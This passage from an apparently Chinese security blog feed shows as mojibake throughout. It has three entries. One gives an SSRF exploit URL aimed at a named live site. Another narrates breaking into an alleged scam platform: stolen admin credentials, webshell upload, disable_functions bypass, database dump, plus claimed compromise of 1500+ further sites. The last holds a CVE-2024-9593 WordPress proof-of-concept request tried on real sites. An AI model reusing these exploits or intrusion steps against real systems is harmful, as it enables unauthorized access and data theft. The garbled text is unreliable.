constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®è¶…æ—¶æ—¶é—´</span>    <span class="token comment">//SSLç›¸å…³</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ssl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç¦ç”¨åcURLå°†ç»ˆæ­¢ä»æœåŠ¡ç«¯è¿›è¡ŒéªŒè¯</span>      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ£€æŸ¥æœåŠ¡å™¨SSLè¯ä¹¦ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå…¬ç”¨å(common name)ã€‚</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// å¤„ç†postç›¸å…³é€‰é¡¹</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ˜¯å¦ä¸ºPOSTè¯·æ±‚</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å¤„ç†è¯·æ±‚æ•°æ®</span>    <span class="token comment">// å¤„ç†å“åº”ç»“æœ</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ˜¯å¦å¤„ç†å“åº”å¤´</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//curl_exec()æ˜¯å¦è¿”å›å“åº”ç»“æœ</span>    <span class="token comment">// å‘å‡ºè¯·æ±‚</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">,</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬éšä¾¿æ‰¾ä¸ªç½‘ç«™çœ‹çœ‹expå°±æ˜¯<a href="https://5319.newadco.com//api/wxapps/_requestPost?url=http://dnslog%E5%9C%B0%E5%9D%80/&amp;data=">https://5319.newadco.com//api/wxapps/_requestPost?url=http://dnslogåœ°å€/&amp;data=</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261421596.png" alt="å®æˆ˜"><br>æ˜¯ä¸æ˜¯å¯ä»¥è¿™ä¹ˆç†è§£ã€‚é‚£æˆ‘ä»¬ç¼–å†™çš„æ—¶å€™ç›´æ¥è¿™ä¹ˆç¼–å†™ä¸å°±è¡Œäº†ã€‚æˆ‘ä»¬çœ‹nuclei ssrfç¼–å†™æ¡ˆä¾‹<br><a href="https://mp.weixin.qq.com/s/Z4IFUVFjhWHYtAUCxz50LQ">https://mp.weixin.qq.com/s/Z4IFUVFjhWHYtAUCxz50LQ</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261426697.png" alt="ssrfç¼–å†™"><br>å¦‚æœæˆ‘ä»¬åˆ©ç”¨pythonæˆ–è€…è‡ªå·±å†™ä¸€ä¸ªç¨‹åºæ¥å®ç°ssrfé‚£å°†ä¼šæ˜¯å¾ˆéº»çƒ¦æ‰€ä»¥æˆ‘ä»¬æ¥ä»‹ç»æˆ‘ä»¬å·¥å…·ç¼–å†™ssrfæ­¥éª¤ã€‚</p><h2 id="å·¥å…·ç¼–å†™ssrfæ¼æ´ä»£ç å±•ç¤º"><a href="#å·¥å…·ç¼–å†™ssrfæ¼æ´ä»£ç å±•ç¤º" class="headerlink" title="å·¥å…·ç¼–å†™ssrfæ¼æ´ä»£ç å±•ç¤º"></a>å·¥å…·ç¼–å†™ssrfæ¼æ´ä»£ç å±•ç¤º</h2><p>ä½¿ç”¨æˆ‘ä»¬çš„å·¥å…·ç¼–å†™ssrfæ¼æ´åªéœ€ç®€å•çš„æŒ‰è§„åˆ™å‘é€è¯·æ±‚å³å¯ã€‚æ³¨æ„:<br>å…¶ä¸­<a href="http://www.dnslog.cn/">www.dnslog.cn</a> åªèƒ½å›½å†…ipä½¿ç”¨ã€‚<br/>è¿™ä¸ªåªèƒ½å›½å¤–åœ°å€ä½¿ç”¨ <a href="https://dnslog.org/">https://dnslog.org</a><br/><br><a href="https://oast.pro/">https://oast.pro/</a> è¿™ä¸ªå›½å†…å¤–ipéƒ½å¯ä»¥ä½¿ç”¨ä¹Ÿå°±æ˜¯nucleiä½¿ç”¨çš„</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261435940.png" alt="ç¼–å†™å®ä¾‹"><br>å¦‚æœè¿”å›çš„æ˜¯vul exist!!! é‚£ä¹ˆå°±å­˜åœ¨æ¼æ´å¹¶ä¸”ç»“æœexpå·²ç»å†™å‡ºæ¥äº†ã€‚<br>æ€ä¹ˆæ ·æˆ‘ä»¬ä½¿ç”¨ä¸‰ä¸ªdnså¹³å°æµ‹è¯•ssrfæ¼æ´å½“ç„¶å®æˆ˜å»ºè®®é€‰æ‹©åé¢ä¸¤ä¸ªå› ä¸ºdnslogåªèƒ½å›½å†…ipä½¿ç”¨ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç°åœ¨è§‰å¾—ç¼–å†™exp pocå¾ˆéš¾ä¹ˆã€‚è¿˜è§‰å¾—éš¾çš„è¯é‚£æ˜¯æ²¡æœ‰é‡åˆ°æˆ‘ä»¬çš„è½¯ä»¶ã€‚åç»­æºç å°èŒƒå›´åˆ†äº«çš„æ—¶å€™ä¼šåœ¨å†…éƒ¨è¾…å¯¼æ•™å­¦ç¼–å†™expã€‚ç›´åˆ°å­¦ä¼šä¸ºæ­¢ã€‚å‰ææ˜¯ä½ å¾—ä¼šæ¸—é€æµ‹è¯•èƒ½çœ‹æ‡‚httpæŠ¥æ–‡ã€‚å’Œä¼šç®€å•çš„ç¼–ç¨‹æœ€å¥½æ˜¯C#ç¼–å†™ã€‚åœ¨è¿™ä¸ªwaf æ»¡å¤©é£çš„æ—¶ä»£æˆ‘ä»¬å¿…é¡»æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„exp pocæ­¦å™¨ã€‚æˆ‘ä»¬çš„æ­¦å™¨ç°åœ¨å¯ä»¥æœ€å°‘æ”¯æŒ100ä¸‡ç½‘ç«™çš„æ‰€æœ‰æ¨¡å—çš„æ‰¹é‡ã€‚ç›®å‰åœ¨æµ‹è¯•æ¡†æ¶1000w urlçš„æ‰¹é‡ã€‚ç›¸ä¿¡å¸‚é¢ä¸Šå¾ˆå°‘æœ‰å·¥å…·å¯ä»¥è¾¾åˆ°è¿™ä¸ªç¨‹åº¦ã€‚ç­‰æµ‹è¯•å®Œæ¯•åœ¨å‘å¸ƒæµ‹è¯•æ–‡ç« ã€‚æ€»ä¹‹å°±æ˜¯ä¼šå‘é€get postè¿™äº›è¯·æ±‚åŒ…å°±è¡Œäº†ã€‚è‡³äºä¸Šä¼ è¿™ä¸ªæ¯”è¾ƒéš¾ã€‚å›å¤´å•ç‹¬è®²è§£å§ã€‚è¿™ä¸ªå°±å†™è¿™ä¹ˆå¤šå§ã€‚è¿™ä¸ªå±äºç›´è¾¾å¿ƒè„æ¯”è¾ƒå±é™©ä½ ä»¬æ‡‚å¾—ä¸é€‚åˆå¤§èŒƒå›´åˆ†äº«ã€‚å› ä¸ºæˆ‘ä»¬çš„è½¯ä»¶å¯ä»¥æŠ—ç™¾ä¸‡urlã€‚ä»Šå¤©å°±è®²åˆ°è¿™é‡Œå§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
            <tag> original </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸè¯ˆéª—å¹³å°æ¸—é€æµ‹è¯•åˆ°ä»£ç å®¡è®¡å‰å°getshellå†ç¨‹</title>
      <link href="/penetrationtest/2024/11/articles/cbd79839949e8ffc/"/>
      <url>/penetrationtest/2024/11/articles/cbd79839949e8ffc/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨æŸå¤©åˆ·æŸéŸ³çš„æ—¶å€™çœ‹åˆ°ä¸€ä¸ªè§†é¢‘æŸéŸ³å¤§é»‘å®¢åœ¨å±•ç¤ºã€‚ä»–æ‰“å‡»æŸè¯ˆéª—appçš„è¿‡ç¨‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251559583.png" alt="èµ·å› "><br>ç„¶åæˆ‘ç¿»è¯„è®ºç¿»åˆ°åº•ä¸‹æœ‰äººè¯´è‡ªå·±è¢«è¯ˆéª—äº†è¯´åœ¨æŸä¸ªå¹³å°ä½“ç°è¢«æ‹’ç»äº†ã€‚å¹¶ä¸”ä»–æŠŠè¿™ä¸ªæˆªå›¾å¸¦ç½‘å€å‘åˆ°è¯„è®ºåŒºäº†ä¼°è®¡æ˜¯æƒ³è®©æŠ–éŸ³å¤§é»‘é˜”å¸®å¿™çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾å›ã€‚å¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251604302.png" alt="è¢«éª—äººæˆªå›¾"><br>äºæ˜¯ä¹æˆ‘æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€å¼€å§‹å¹²äº†ã€‚</p><h2 id="æ¸—é€è¿‡ç¨‹"><a href="#æ¸—é€è¿‡ç¨‹" class="headerlink" title="æ¸—é€è¿‡ç¨‹"></a>æ¸—é€è¿‡ç¨‹</h2><p>ç”±äºæ˜¯ipåœ°å€æˆ‘åœ¨fofa è¿™äº›å¹³å°æŸ¥è¯¢äº†ä¸€ä¸‹åŒipä¸åŒç«¯å£çš„æƒ…å†µæ˜¾ç¤ºå°±å¼€æ”¾ç½‘ç«™å¦å¤–æ­¤æœ‰é˜²ç«å¢™ä½¿ç”¨ç«¯å£æ‰«æå·¥å…·å¼€æ”¾ç«¯å£æ‰«æä¸åˆ°ã€‚åªèƒ½ä»ç½‘ç«™ç›´æ¥å…¥æ‰‹äº†ã€‚å‘ç°è¯¥ç³»ç»Ÿæ˜¯thinkphp ã€‚æœ‰çš„å¤§ä½¬è¯´æ²ƒæ—¥ç›´æ¥ä¸Šrce ç¡®å®æ˜¯æœ‰çš„ä½¿ç”¨çš„æ˜¯thinkphp 5.0.23ä»¥ä¸‹çš„ä¹Ÿå†™ä¸Š5.0.24ä½†æ˜¯è¿™ä¸ªçœŸçš„æ˜¯5.0.24<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251611763.png" alt="ç½‘ç«™ç‰¹å¾"><br>æˆ‘ä»¬æµè§ˆäº†ä¸€æ³¢ç½‘ç«™æ³¨å†Œç”¨æˆ·ä»€ä¹ˆçš„æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¼æ´å¦å¤–åå°ä¹Ÿæ‰¾ä¸åˆ°ã€‚è¿™æ˜¯å¿½ç„¶æƒ³èµ·ä¸€æ³¢æ—¥å¿—æ˜¯ä¸æ˜¯å¯ä»¥çœ‹çœ‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251615062.png" alt="æ—¥å¿—"><br>ä¸€çœ‹è¿™ç§æ—¥å¿—ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆä»·å€¼ã€‚çœ‹äº†å‡ ä¸ªå°æ—¶æ­£å½“æ”¾å¼ƒçš„æ—¶å€™ã€‚æ­£å¥½è¿™æ—¶å€™ç®¡ç†å‘˜ä¸Šçº¿äº†å¹¶ä¸”è¿™ä¸ªè®°å½•ç®¡ç†å‘˜è´¦å·å¯†ç ã€‚æ‰€ä»¥é¡ºåˆ©æ‹¿åˆ°äº†ç®¡ç†å‘˜è´¦å·å¯†ç è¿›å»åå°ã€‚å¹¶ä¸”æ—¥å¿—é‡Œé¢ä¹Ÿæœ‰åå°åœ°å€ã€‚å¦‚æœä¸ç¿»ä¸ç­‰é‚£ä¹ˆä¼°è®¡ä¹Ÿä¸ä¼šå‘ç°æ—¥å¿—é‡Œé¢å­˜åœ¨ç®¡ç†å‘˜è´¦å·ã€‚æ‰€ä»¥è¿æ°”æˆåˆ†æ¯”è¾ƒå¤§<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251618121.png" alt="æ—¥å¿—è·å–è´¦å·å¯†ç "><br>ä½¿ç”¨è´¦å·å¯†ç æˆåŠŸç™»å½•åå°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251620902.png" alt="æˆåŠŸç™»å½•åå°"><br>æ‰¾åˆ°åå°å½“ç„¶æ˜¯getshellã€‚ä»€ä¹ˆæœ€å¿«å½“ç„¶æ˜¯ä¸Šä¼ è¿™ä¸ªè¯ˆéª—å¹³å°æ²¡æœ‰ä½¿ç”¨wafç›´æ¥ä¸Šä¼ getshellã€‚å¼€å§‹ä½¿ç”¨å†°èå…æ€shellã€‚ç”±äºæœ‰disable_functioinæ‰€ä»¥ä¸Šå“¥æ–¯æ‹‰äº†ã€‚ä½¿ç”¨å“¥æ–¯æ‹‰bypass diable_functionæˆåŠŸæ‰§è¡Œå‘½ä»¤<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251624686.png" alt="æ‰§è¡Œå‘½ä»¤"><br>æ‰“åŒ…æºä»£ç </p><h2 id="ä»£ç å®¡è®¡å‘ç°0dayæ¼æ´"><a href="#ä»£ç å®¡è®¡å‘ç°0dayæ¼æ´" class="headerlink" title="ä»£ç å®¡è®¡å‘ç°0dayæ¼æ´"></a>ä»£ç å®¡è®¡å‘ç°0dayæ¼æ´</h2><p>æˆ‘ä»¬æ‰“åŒ…ä»£ç ä»¥åä½¿ç”¨adminer è„±è£¤ä»¥ååœ¨æœ¬åœ°æ­å»ºç½‘ç«™å¯¹å…¶è¿›è¡Œä»£ç å®¡è®¡ã€‚å¯¹äº†ä½¿ç”¨adminer è„±è£¤çš„æœ€å¥½ä½¿ç”¨phpmyadminå¯¼å…¥æ•°æ®åº“.sqlæ–‡ä»¶ã€‚è¿™æ ·ä¸ä¼šæŠ¥é”™ã€‚æ³¨æ„åœ¨è„±è£¤çš„æ—¶å€™è¦çŸ¥é“æ•°æ®åº“å­—ç¬¦é›†ç¼–ç å’Œæ’åºè§„åˆ™ç¼–ç ã€‚è¿™æ ·æ‰å¯ä»¥åœ¨æœ¬åœ°æ­å»ºæˆåŠŸã€‚åœ¨ä»£ç å®¡è®¡å‘ç°ssrf æ¼æ´å¯ä»¥ç›´æ¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚å½“ç„¶è¿˜æœ‰å…¶ä»–æ¼æ´æ¯”å¦‚ ååºåˆ—åŒ–ã€‚æ–‡ä»¶ä¸Šä¼ ã€‚æ–‡ä»¶ä¸Šä¼ é…åˆååºåˆ—åŒ–æ¼æ´å¯ä»¥ç›´æ¥æ‹¿shellã€‚å…³äºä»£ç çš„æˆ‘å·²ç»åœ¨é¢‘é“å‘å¸ƒäº†ã€‚æ²¡æœ‰åŠ æ•°æ®åº“é‚£å¥—ç³»ç»Ÿæ˜¯æ—§ç‰ˆæœ¬åŒæ ·å­˜åœ¨æ¼æ´ã€‚è‡ªå·±å®¡è®¡å§ã€‚å›å¤´æœ‰ç©ºæŠŠè¿™äº›é›†æˆåˆ°å·¥å…·é‡Œé¢ã€‚å¦å¤–åœ¨æå®Œè¿™ä¸ªç«™çš„æ—¶å€™ã€‚åˆæœ‰éªšæ‰°çŸ­ä¿¡å‘è¿‡æ¥äº†ã€‚è¿æ°”å¥½æŠŠè¿™ä¸ªéªšæ‰°çŸ­ä¿¡çš„ç«™ç‚¹ä¹Ÿç»™æ—¥äº†ã€‚è¿™ä¸ªæ¶‰åŠèŒƒå›´æ¯”è¾ƒå¹¿ç”¨1500å¤šä¸ªç«™ç‚¹æš‚æ—¶å°±ä¸å‘å¸ƒæ–‡ç« äº†é‚£ä¸ªä¹Ÿæ˜¯ä»£ç å®¡è®¡å®¡è®¡å‡ºæ¥çš„0dayæ¼æ´ç›´æ¥è¿›åå°é…åˆæ¨¡æ¿ç›´æ¥getshellã€‚æ”¾åˆ°å›¾å§ã€‚å›å¤´è¿™äº›è¯¦ç»†è¿‡ç¨‹å°èŒƒå›´åˆ†äº«ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251630255.png" alt="ssrf"><br>å¹¿å‘Šç«™ç‚¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251639460.png" alt="å¹¿å‘Šç«™"></p><h2 id="ä»£ç å®¡è®¡æ¸—é€æµ‹è¯•æ€»ç»“"><a href="#ä»£ç å®¡è®¡æ¸—é€æµ‹è¯•æ€»ç»“" class="headerlink" title="ä»£ç å®¡è®¡æ¸—é€æµ‹è¯•æ€»ç»“"></a>ä»£ç å®¡è®¡æ¸—é€æµ‹è¯•æ€»ç»“</h2><p>(1)å¦‚ä½•å­¦ä¹ phpä»£ç å®¡è®¡:éœ€è¦å…·å¤‡ phpåŸºç¡€çŸ¥è¯† éœ€è¦ä¼šå†™ç®€å•çš„ç½‘ç«™åå° éœ€è¦çŸ¥é“thinkphpçŸ¥è¯†ã€‚éœ€è¦ä¼šæ¸—é€æµ‹è¯•ã€‚éœ€è¦æœ‰phpä»£ç å®¡è®¡åŠŸåº•ã€‚å…·å¤‡è¿™äº›ä½ å°±å¯ä»¥æŒ–äº†ã€‚è¿™äº›æ˜¯åŸºç¡€æ¡ä»¶è‡³äºèƒ½ä¸èƒ½æŒ–åˆ°å–å†³äºä»£ç å®‰å…¨ç¨‹åº¦å’Œè‡ªå·±çš„åŠŸåº•ã€‚ä¸¤è€…ç¼ºä¸€ä¸å¯ã€‚æˆ‘ä»¬åœ¨é¢‘é“ç¾¤é‡Œé¢å·²ç»è¯´äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251644971.png" alt="ä»£ç å®¡è®¡å­¦ä¹ "><br>å…¶ä»–å®¡è®¡ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚å¦å¤–çœ‹ä¸€ä¸‹mcvå¼€å‘ä¸œä¸œéƒ½æ˜¯ç›¸é€šçš„å†çœ‹çœ‹ç±»ç»§æ‰¿,æ¥å£ç­‰ç­‰ä¸œè¥¿è¿™åœ¨ä»£ç å®¡è®¡é‡Œé¢ç”¨çš„å¾ˆå¤š.<br>è½¯ä»¶è¾…åŠ©æ¸—é€æµ‹è¯•:<br>(2)è½¯ä»¶å¤§æ‰¹é‡è·‘è¿˜æ˜¯å¯ä»¥çš„è¿™ä¸ªç«™ä¼°è®¡ç›´æ¥æä¸å¤ªå¥½æå¾—æ‰«æğŸ˜‚ã€‚ã€‚ã€‚ã€‚è¿˜æ˜¯å¾—urlå¤šã€‚ç„¶åexpå¤šæ‰å¯ä»¥å•Šã€‚ç¼ºä¸€ä¸å¯å•Šè¿™ä¸¤ä¸ªğŸ˜ã€‚æå‡ºæ¥è„±è£¤ï¼Œç„¶åä»£ç å®¡è®¡æ‰¹é‡ã€‚ä¸æ˜¯tpç«™ä¹Ÿä¸æ˜¯çŸ¥åæ¼æ´æ˜¯é€šè¿‡ç»„ä»¶æ¼æ´getshellå¾—ğŸ˜‚ã€‚åœ¨è¿™ä¸ªwafæ»¡å¤©é£å¾—æ—¶ä»£ä¸è¦ä¸€ç›´ä¾èµ–å·¥å…·ã€‚å·¥å…·åªæ˜¯è¾…åŠ©è¿˜æ˜¯å¾—é è‡ªèº«ã€‚æˆ‘å®¡è®¡çš„é‚£ä¸ªæºç åˆ©ç”¨éš¾åº¦æ¯”è¾ƒä½ä½†æ˜¯æœ‰æ¡ä»¶æ‰èƒ½åˆ©ç”¨æˆåŠŸã€‚è¿™ä¸ªæ¼æ´åªèƒ½æ‰“9åˆ†ä¸ç†æƒ³ã€‚ã€‚ã€‚ã€‚é€šæ€æ˜¯é€šæ€ä½†é€šæ€çš„ä¸å¤šã€‚å‡ åƒä¸ªç½‘ç«™åå°æƒ³æƒ³å°±ç‰›é€¼å•Šã€‚è¿™ç©æ„æ˜¯åŸºäºåŸå§‹ä»£ç é‡æ–°ç ”å‘çš„æˆ‘åªæœ‰åŸå§‹ä»£ç æ²¡æœ‰å˜å½¢çš„ä»£ç è¿™å°±éš¾æäº†ã€‚éœ€è¦å¤§å¤šæ•°é€šæ€å¾—æåˆ°å˜å½¢çš„ä»£ç åœ¨çœ‹çœ‹èƒ½ä¸èƒ½é…åˆåˆ©ç”¨ã€‚è¿™ä¹Ÿèƒ½æˆä¸ºæ‰€ä»¥å¾—aptä½†æ˜¯ä¸æ˜¯é‚£ç§ğŸ˜‚ã€‚åå°å€’æ˜¯æ¼æ´å¤šæ²¡å•¥ç”¨ã€‚è¿™æ··cve cvndå¯ä»¥ã€‚å®æˆ˜ä¸è¡Œã€‚è¦æè¿˜å¾—æ˜¯å‰å°æˆ–è€…æ— è§†åå°åˆ©ç”¨é‚£æ‰ç‰›é€¼ã€‚å‰æ®µæ—¶é—´æå¾—é‚£ä¸ªè¯ˆéª—ç½‘ç«™åªè¦æ˜¯é»˜è®¤ä»£ç éƒ½é€šæ€ã€‚é‚£ä¸ªç”¨çš„ä¸å¤šã€‚é‚£ä¸ªä¹Ÿæ‰“9åˆ†å§ä¸å¤ªæ»¡æ„ã€‚æœ‰ä¸ª.net å¾—dayçš„ç«™é‚£ä¸ªæ˜¯éœ€è¦æ³¨å†Œç”¨æˆ·æ‰èƒ½getshellã€‚è¿™ç§æ¼æ´ä¹Ÿå°±8åˆ†å§ã€‚ä¸å¤ªæ»¡æ„ã€‚è‡³äºé‚£ç§ç®€å•çš„ä¸Šä¼ ï¼Œæ³¨å…¥å‰å°çš„æ²¡å•¥æŠ€æœ¯å«é‡ã€‚æ˜¯äººéƒ½å¯ä»¥å®¡è®¡è¡¨é¢10åˆ†ä½†æ˜¯å®é™…ä¸Šä¹Ÿå°±å€¼5åˆ†ã€‚ã€‚æœ€åæ€»ç»“:è¿™å¹´å¤´å­¦æŠ€æœ¯ä¸ç®¡æ˜¯æç«™å•æªåŒ¹é©¬ä¸è¡Œè¿˜æ˜¯ï¼Œå›¢é˜Ÿåˆä½œç„¶ååšä»£ç å®¡è®¡æå†…ç½‘å¯æŒç»­æ”»å‡»ã€‚æ”»å‡»ä¾›åº”å•†çš„ç«™èƒ½æ‰“ä¸€æ‰¹é‚£ç»å¯¹æ‰‹æ¡å¤šå°‘0dayğŸ˜‚ğŸ˜ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251647635.png" alt="é…åˆè½¯ä»¶æ‹¿ä¸‹æ—ç«™è·å–ç›®æ ‡æºç "><br>å°±è¯´è¿™äº›ä¸‹è¯¾å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çª¥æ¢wordpress CVE-2024-9593æ‰€è°“ä»£ç æ‰§è¡Œæ¼æ´çš„ç§˜å¯†</title>
      <link href="/penetrationtest/2024/11/articles/34f1892bb33c988c/"/>
      <url>/penetrationtest/2024/11/articles/34f1892bb33c988c/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨æµè§ˆæŸäº›ç½‘ç«™çš„ç½‘ç«™çš„æ—¶å€™å‘ç°WordPresså­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚å³ä¸ºCVE-2024-9593 åœ¨githubæœç´¢ä¸­å‘ç°å¦‚ä¸‹pocé“¾æ¥:<br><a href="https://github.com/RandomRobbieBF/CVE-2024-9593">https://github.com/RandomRobbieBF/CVE-2024-9593</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041557581.jpg" alt="poc"></p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>wp<span class="token operator">-</span>admin<span class="token operator">/</span>admin<span class="token operator">-</span>ajax<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>etimeclockwp_load_function HTTP<span class="token operator">/</span><span class="token number">2</span><span class="token class-name">Host</span><span class="token operator">:</span> wpscan<span class="token operator">-</span>vulnerability<span class="token operator">-</span>test<span class="token operator">-</span>bench<span class="token punctuation">.</span>ddev<span class="token punctuation">.</span>site<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">58.0</span><span class="token number">.3029</span><span class="token number">.110</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.3</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">16</span>function<span class="token operator">=</span>phpinfo</code></pre><p>äºæ˜¯ä¹æ‰¾ä¸€æ³¢ç½‘ç«™å®æˆ˜ç½‘ç«™æ˜¯æ‰¾åˆ°äº†ä½†æ˜¯getshellæƒ³äº†å¾ˆå¤šæ²¡æœ‰æˆæœã€‚é‚£æˆ‘ä»¬æ¥ä¸‹æ¥ç ”ç©¶ä¸€ä¸‹æ¼æ´åŸç†è¿™ä¸ªåˆ°åº•æ˜¯ä»€ä¹ˆå¼•å‘çš„è¿™ä¸ªæ¼æ´ã€‚çœ‹çœ‹èƒ½ä¸èƒ½ä»ä¸­å¾—åˆ°å¯å‘ã€‚<br>äº’è”ç½‘æ‰¾åˆ°çš„å®æˆ˜ç«™ç‚¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041602042.png" alt="äº’è”ç½‘ç½‘ç«™"></p><h2 id="åˆ†æä»£ç "><a href="#åˆ†æä»£ç " class="headerlink" title="åˆ†æä»£ç "></a>åˆ†æä»£ç </h2><p>æˆ‘ä»¬åœ¨cveç½‘ç«™ä¸Šé¢æœç´¢ä¸€ä¸‹ç¼–ç <a href="https://www.cve.org/CVERecord?id=CVE-2024-9593">https://www.cve.org/CVERecord?id=CVE-2024-9593</a>  å‘ç°æ¼æ´ç­‰çº§ä¸º8.3 çº§ç„¶åå‘ç°å¦‚ä¸‹å¼•ç”¨ï¼š</p><pre class="language-java" data-language="java"><code class="language-java">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>wordfence<span class="token punctuation">.</span>com<span class="token 